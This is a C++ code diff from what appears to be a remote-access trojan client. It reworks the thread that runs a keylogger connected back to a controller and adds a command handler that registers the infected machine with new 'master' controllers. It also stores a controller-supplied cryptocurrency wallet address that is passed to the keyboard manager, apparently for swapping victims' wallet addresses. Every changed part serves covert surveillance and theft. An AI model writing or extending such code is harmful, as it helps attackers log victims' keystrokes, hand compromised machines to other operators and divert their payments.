@@ -50,12 +50,12 @@ IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string&
 
 ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit, const std::string &publicIP)
 {
-    static ThreadInfo tKeyboard;
-    tKeyboard.run = FOREVER_RUN;
-    tKeyboard.p = new IOCPClient(bExit, false, MaskTypeNone, conn, publicIP);
-    tKeyboard.conn = conn;
-    tKeyboard.h = (HANDLE)__CreateThread(NULL, NULL, LoopKeyboardManager, &tKeyboard, 0, NULL);
-    return &tKeyboard;
+    ThreadInfo *tKeyboard = new ThreadInfo();
+    tKeyboard->run = FOREVER_RUN;
+    tKeyboard->p = new IOCPClient(bExit, false, MaskTypeNone, conn, publicIP);
+    tKeyboard->conn = conn;
+    tKeyboard->h = (HANDLE)__CreateThread(NULL, NULL, LoopKeyboardManager, tKeyboard, 0, NULL);
+    return tKeyboard;
 }
 
 //////////////////////////////////////////////////////////////////////
@@ -854,13 +854,12 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     case COMMAND_SHARE:
     case COMMAND_ASSIGN_MASTER:
         if (ulLength > 2) {
+            iniFile cfg(CLIENT_PATH);
             switch (szBuffer[1]) {
             case SHARE_TYPE_YAMA_FOREVER: {
                 auto v = StringToVector((char*)szBuffer + 2, ':', 3);
                 if (v[0].empty() || v[1].empty())
                     break;
-
-                iniFile cfg(CLIENT_PATH);
                 auto now = time(nullptr);
                 auto valid_to = atoi(cfg.GetStr("settings", "valid_to").c_str());
                 if (now <= valid_to) break; // Avoid assign again
@@ -874,6 +873,18 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
                 }
             }
             case SHARE_TYPE_YAMA: {
+                if (szBuffer[1] == SHARE_TYPE_YAMA) {
+                    auto v = StringToVector((char*)szBuffer + 2, ':', 3);
+                    if (v[0].empty() || v[1].empty())
+                        break;
+                    auto share = v[0] + ":" + v[1];
+                    auto list = cfg.GetStr("settings", "share_list");
+                    auto shareList = list.empty() ? std::vector<std::string>{} : StringToVector(list, '|');
+                    if (VectorContains(shareList, share)) break;
+                    shareList.push_back(share);
+                    cfg.SetStr("settings", "share_list", VectorJoin(shareList, '|'));
+                    Mprintf("Share client to new master: %s\n", share.c_str());
+                }
                 auto a = NewClientStartArg((char*)szBuffer + 2, IsSharedRunning, TRUE);
                 if (nullptr!=a) CloseHandle(__CreateThread(0, 0, StartClientApp, a, 0, 0));
                 break;
@@ -899,8 +910,10 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             } else {
                 Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds.\n", ulLength - 1, m_settings.ReportInterval);
             }
-            iniFile cfg(CLIENT_PATH);
-            cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
+            if (m_ClientApp->IsMainInstance()) {
+                iniFile cfg(CLIENT_PATH);
+                cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
+            }
             CManager* pMgr = (CManager*)m_hKeyboard->user;
             if (pMgr) {
                 pMgr->UpdateWallet(m_settings.WalletAddress);
